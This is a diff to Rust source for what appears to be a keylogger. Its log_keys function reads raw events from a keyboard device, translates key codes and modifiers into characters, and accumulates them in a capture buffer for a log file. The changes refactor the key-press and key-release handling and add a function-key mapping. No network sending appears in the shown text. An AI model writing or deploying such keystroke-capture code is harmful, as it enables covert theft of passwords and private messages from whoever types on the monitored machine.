@@ -1,4 +1,4 @@
-use std::{fs::{File, OpenOptions, self}, io::{self, BufRead, Read, Cursor}, path::Path, mem::{size_of, self}, collections::HashMap, time::SystemTime};
+use std::{fs::{File, OpenOptions, self}, io::{self, BufRead, Read, Cursor}, path::Path, collections::HashMap, time::SystemTime};
 use byteorder::{NativeEndian, ReadBytesExt};
 use anyhow::Result;
 
@@ -36,15 +36,7 @@ pub(crate) fn find_keyboard_device() -> Result<String> {
     Ok(keyboard_file)
 }
 
-struct input_event {
-    // struct timeval time;
-    timeval: [u8; 62],
-    event_type: u16,
-    code: u16,
-    value: u32,
-}
-
-fn set_modifier(key_char: &str, shift: bool, capslock: bool, ctrl: bool, option: bool, func: bool) -> Result<String> {
+fn set_modifier(key_char: &str, shift: bool, capslock: bool, _ctrl: bool, _option: bool, _func: bool) -> Result<String> {
     // let special_chars = "1234567890[]/=\\;',.`";
     let shift_mapping: HashMap<&str, &str> = HashMap::from([
         ("1", "!"),
@@ -153,6 +145,7 @@ pub(crate) fn log_keys(keyboard_device_path: String, log_file: String, write_int
         (105 as u16, "[leftarrow]"),
         (108 as u16, "[downarrow]"),
         (57 as u16, "[space]"),
+        (125 as u16, "[Lfunction]"),
     ]);
 
     let mut shift: bool = false;
@@ -173,8 +166,8 @@ pub(crate) fn log_keys(keyboard_device_path: String, log_file: String, write_int
     loop {
         dev_file.read_exact(&mut packet).unwrap();
         let mut rdr = Cursor::new(packet);
-        let _tv_sec  = rdr.read_u64::<NativeEndian>().unwrap();
-        let _tv_usec = rdr.read_u64::<NativeEndian>().unwrap();
+        let tv_sec  = rdr.read_u64::<NativeEndian>().unwrap();
+        let tv_usec = rdr.read_u64::<NativeEndian>().unwrap();
         let evtype  = rdr.read_u16::<NativeEndian>().unwrap();
         let code    = rdr.read_u16::<NativeEndian>().unwrap();
         let value   = rdr.read_i32::<NativeEndian>().unwrap();
@@ -196,8 +189,8 @@ pub(crate) fn log_keys(keyboard_device_path: String, log_file: String, write_int
         //     println!("shift: {} capslock: {} ctl: {} option: {} function: {}", shift, capslock, ctrl, option, func);
         // }
         if code != 0 && (evtype == 1 && (value == 1 || value == 0)) {
-            if value == 1 {
-                if qwerty_map_no_mod.contains_key(&code) {
+            if qwerty_map_no_mod.contains_key(&code) {
+                if value == 1 {
                     if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = true };
                     if qwerty_map_no_mod[&code] == "[capslock]" { capslock = !capslock };
                     if qwerty_map_no_mod[&code] == "[Lctrl]" || qwerty_map_no_mod[&code] == "[Rctrl]" { ctrl = true };
@@ -206,24 +199,18 @@ pub(crate) fn log_keys(keyboard_device_path: String, log_file: String, write_int
                     if qwerty_map_no_mod[&code] == "[Lfunction]" || qwerty_map_no_mod[&code] == "[Rfunction]" { func = true };
 
                     capture_buffer.push_str(set_modifier(qwerty_map_no_mod[&code], shift, capslock, ctrl, option, func ).unwrap().as_str());
-                 
-                }else{
-                    println!("{} {} {} {} {}", _tv_sec, _tv_usec, evtype, code, value);
-                }
-            }else if value == 0 {
-                if qwerty_map_no_mod.contains_key(&code) {
+                    
+                }else if value == 0 {
                     if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = false };
                     if qwerty_map_no_mod[&code] == "[Lctrl]" || qwerty_map_no_mod[&code] == "[Rctrl]" { ctrl = false };
                     if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = false };
                     if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = false };
-                }else{
-                    println!("{} {} {} {} {}", _tv_sec, _tv_usec, evtype, code, value);
                 }
+            } else if value == 1 || value == 0 {
+                println!("{} {} {} {} {}", tv_sec, tv_usec, evtype, code, value);
             }
         }
     }
-
-    Ok(())
 }
 
 
